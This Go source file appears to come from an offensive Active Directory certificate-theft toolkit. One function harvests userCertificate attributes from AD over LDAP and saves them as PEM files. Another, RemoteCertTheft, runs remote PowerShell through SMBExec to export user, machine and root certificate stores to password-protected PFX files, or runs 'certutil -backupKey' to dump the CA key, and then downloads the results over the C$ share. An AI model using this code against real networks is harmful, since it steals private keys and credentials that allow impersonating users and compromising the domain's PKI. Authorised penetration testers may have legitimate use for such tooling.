package pki

import (
	"context"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/go-ldap/ldap/v3"
)

// ExtractUserCertificatesLDAP queries Active Directory for userCertificate
// attributes on all user and computer objects, parses the DER-encoded X.509
// certificates, and writes them as PEM files to the output directory.
func ExtractUserCertificatesLDAP(cfg *ADCSConfig, outputDir string) (int, error) {
	fmt.Println("[*] THEFT4: Extracting userCertificate attributes from AD via LDAP...")

	conn, err := ConnectLDAP(context.Background(), cfg)
	if err != nil {
		return 0, fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	parts := strings.Split(cfg.Domain, ".")
	var dcParts []string
	for _, p := range parts {
		dcParts = append(dcParts, "DC="+p)
	}
	baseDN := strings.Join(dcParts, ",")

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false,
		"(userCertificate=*)",
		[]string{"sAMAccountName", "distinguishedName", "userCertificate", "objectClass"},
		nil,
	)

	result, err := conn.SearchWithPaging(searchReq, 100)
	if err != nil {
		return 0, fmt.Errorf("LDAP search for userCertificate: %w", err)
	}

	if len(result.Entries) == 0 {
		fmt.Println("[*] No objects with userCertificate attribute found")
		return 0, nil
	}

	fmt.Printf("[+] Found %d object(s) with certificates\n", len(result.Entries))

	if err := os.MkdirAll(outputDir, 0700); err != nil {
		return 0, fmt.Errorf("create output dir: %w", err)
	}

	totalCerts := 0
	for _, entry := range result.Entries {
		sam := entry.GetAttributeValue("sAMAccountName")
		if sam == "" {
			sam = "unknown"
		}

		certValues := entry.GetRawAttributeValues("userCertificate")
		if len(certValues) == 0 {
			continue
		}

		for i, certDER := range certValues {
			cert, err := x509.ParseCertificate(certDER)
			if err != nil {
				fmt.Printf("[!] %s: certificate %d parse error: %v\n", sam, i, err)
				continue
			}

			safeName := strings.ReplaceAll(sam, " ", "_")
			safeName = strings.ReplaceAll(safeName, "/", "_")
			fileName := fmt.Sprintf("%s_cert%d.pem", safeName, i)
			pemPath := filepath.Join(outputDir, fileName)

			pemFile, err := os.Create(pemPath)
			if err != nil {
				fmt.Printf("[!] %s: create file %s: %v\n", sam, pemPath, err)
				continue
			}

			if err := pem.Encode(pemFile, &pem.Block{Type: "CERTIFICATE", Bytes: certDER}); err != nil {
				pemFile.Close()
				fmt.Printf("[!] %s: write PEM: %v\n", sam, err)
				continue
			}
			pemFile.Close()

			totalCerts++
			fmt.Printf("[+] %s: CN=%s, Issuer=%s, Expires=%s → %s\n",
				sam, cert.Subject.CommonName, cert.Issuer.CommonName,
				cert.NotAfter.Format("2006-01-02"), pemPath)
		}
	}

	fmt.Printf("\n[+] THEFT4 complete: extracted %d certificate(s) → %s\n", totalCerts, outputDir)
	return totalCerts, nil
}

// RemoteCertTheft performs automated remote certificate extraction via SMBExec.
func RemoteCertTheft(target, method string, cfg *ADCSConfig) error {
	fmt.Printf("[*] Automated Remote Cert Theft: %s on %s\n", method, target)

	var remoteCmd string
	var remoteFile string

	switch strings.ToLower(method) {
	case "theft1":
		remoteFile = "theft1.pfx"
		remoteCmd = fmt.Sprintf("powershell -Command \"Get-ChildItem Cert:\\CurrentUser\\My | Export-PfxCertificate -FilePath C:\\Windows\\Temp\\%s -Password (ConvertTo-SecureString -String 'Trusted123!' -Force -AsPlainText)\"", remoteFile)
	case "theft2":
		remoteFile = "theft2.pfx"
		remoteCmd = fmt.Sprintf("powershell -Command \"Get-ChildItem Cert:\\LocalMachine\\My | Export-PfxCertificate -FilePath C:\\Windows\\Temp\\%s -Password (ConvertTo-SecureString -String 'Trusted123!' -Force -AsPlainText)\"", remoteFile)
	case "theft3":
		remoteFile = "theft3.pfx"
		remoteCmd = fmt.Sprintf("powershell -Command \"Get-ChildItem Cert:\\LocalMachine\\Root | Export-PfxCertificate -FilePath C:\\Windows\\Temp\\%s -Password (ConvertTo-SecureString -String 'Trusted123!' -Force -AsPlainText)\"", remoteFile)
	case "theft5":
		remoteFile = "ca.p12"
		remoteCmd = fmt.Sprintf("certutil -backupKey C:\\Windows\\Temp\\%s", remoteFile)
	default:
		return fmt.Errorf("unknown remote theft method: %s", method)
	}

	if err := SMBExec(target, remoteCmd, cfg); err != nil {
		return fmt.Errorf("SMBExec failed: %w", err)
	}

	fmt.Printf("[*] Downloading extracted certificate from %s...\n", remoteFile)
	// Open new session to download
	conn, err := net.DialTimeout("tcp", target+":445", 10*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()
	s := &smbSession{conn: conn}
	s.negotiate()
	s.sessionSetupNTLM(cfg)
	s.treeConnect(target, "C$")

	data, err := s.downloadFile("Windows\\Temp\\" + remoteFile)
	if err != nil {
		return fmt.Errorf("download failed: %w", err)
	}

	localFile := method + "_" + target + ".pfx"
	if err := os.WriteFile(localFile, data, 0600); err != nil {
		return err
	}

	fmt.Printf("[+] Successfully extracted and saved certificate to %s\n", localFile)
	return nil
}
